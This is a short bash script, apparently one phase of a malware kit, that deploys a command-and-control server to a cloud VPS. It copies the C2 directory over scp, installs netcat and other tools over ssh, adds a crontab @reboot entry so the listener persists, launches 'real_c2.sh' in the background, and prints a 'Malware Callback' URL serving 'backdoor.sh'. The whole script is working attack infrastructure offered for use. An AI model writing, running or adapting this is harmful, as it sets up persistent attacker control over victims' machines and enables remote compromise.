#!/bin/bash
# PHASE 16: AUTO VPS DEPLOYER
# Deploys C2 to Oracle Cloud / Any VPS

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo "╔══════════════════════════════════════╗"
echo "║  🖥️  C2 VPS AUTO-DEPLOYER v1.0     ║"
echo "╚══════════════════════════════════════╝"
echo ""

echo -ne "${YELLOW}VPS IP: ${NC}"; read -r VPS_IP
echo -ne "${YELLOW}VPS Username (ubuntu): ${NC}"; read -r VPS_USER
VPS_USER=${VPS_USER:-ubuntu}

echo ""
echo -e "${CYAN}[*] Deploying C2 to $VPS_USER@$VPS_IP...${NC}"

# Copy entire C2 server to VPS
scp -r ~/c2_server "$VPS_USER@$VPS_IP:~/"

# Install dependencies on VPS
ssh "$VPS_USER@$VPS_IP" << 'VPSCOMMANDS'
    sudo apt update
    sudo apt install -y netcat-openbsd sqlite3 python3 curl
    chmod +x ~/c2_server/**/*.sh
    chmod +x ~/c2_server/*.sh
VPSCOMMANDS

# Start C2 on VPS (persist after reboot)
ssh "$VPS_USER@$VPS_IP" "crontab -l 2>/dev/null; echo '@reboot cd ~/c2_server && bash listener/real_c2.sh &' | crontab -"

# Start now
ssh "$VPS_USER@$VPS_IP" "cd ~/c2_server && nohup bash listener/real_c2.sh > /dev/null 2>&1 &"

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  ✅ C2 DEPLOYED TO VPS!             ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo -e "  🌐 C2 Public IP: ${GREEN}$VPS_IP${NC}"
echo -e "  🔗 Malware Callback: ${GREEN}http://$VPS_IP/backdoor.sh${NC}"
echo ""
echo -e "  ${YELLOW}[!] This IP NEVER changes!${NC}"
echo -e "  ${YELLOW}[!] C2 runs 24/7 even if phone off!${NC}"
